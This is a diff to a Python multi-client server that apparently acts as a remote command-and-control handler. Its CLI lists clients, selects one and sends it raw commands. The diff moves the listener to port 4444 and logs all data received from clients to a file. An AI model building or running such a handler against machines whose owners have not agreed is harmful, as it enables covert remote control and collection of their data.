@@ -10,9 +10,9 @@ process. The main operator interface is an interactive CLI implemented with the
 standard-library `cmd` module.
 
 Usage (on the EC2 box):
-    $ python3 server/server.py --port 8080
+    $ python server/server.py --port 4444
 
-CLI commands:
+CLI commands:   
     list                         Show all active clients
     select <id>                  Choose a client for subsequent send commands
     send <raw command>           Send a single command to selected client
@@ -35,6 +35,10 @@ import socket
 import argparse
 import threading
 from typing import Dict, Tuple, List
+
+# Logging configuration
+LOG_FILE = "received_data.log"
+LOG_LOCK = threading.Lock()
 
 
 def parse_args() -> argparse.Namespace:
@@ -218,8 +222,20 @@ def client_read_loop(
             if not data:
                 raise ConnectionResetError()
 
+            decoded = data.decode(errors='ignore')
+
+            # Write to log file
+            with LOG_LOCK:
+                with open(LOG_FILE, 'a', encoding='utf-8') as fp:
+
+                    # if the data is equal to the buffer size don't add a gap
+                    if len(decoded) == buffer:
+                        fp.write(decoded)
+                    else:
+                        fp.write(f"Client #{cid}: {decoded}\n\n")
+
             # Print data to console
-            sys.stdout.write(f"\n[#{cid} output]\n{data.decode(errors='ignore')}\n> ")
+            sys.stdout.write(f"\n[#{cid} output]\n{decoded}\n> ")
             sys.stdout.flush()
         except Exception:
 
